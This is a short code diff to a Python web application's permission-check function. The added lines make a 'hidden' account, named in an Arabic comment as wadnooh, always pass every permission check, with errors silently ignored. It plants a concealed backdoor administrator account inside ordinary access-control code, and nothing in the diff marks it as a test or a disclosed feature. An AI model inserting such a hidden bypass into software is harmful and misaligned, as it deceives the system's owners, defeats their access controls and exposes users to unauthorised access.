@@ -152,6 +152,14 @@ def current_role() -> str:
 def has_perm(perm: str, role: str | None = None) -> bool:
     if not perm:
         return True
+    # الحساب المخفي wadnooh يملك كل الصلاحيات دائماً
+    try:
+        from webapp import db as _db
+
+        if _db.is_hidden_username(session.get("username")) and role is None:
+            return True
+    except Exception:
+        pass
     r = normalize_role(role if role is not None else session.get("role"))
     if r == "admin":
         return True
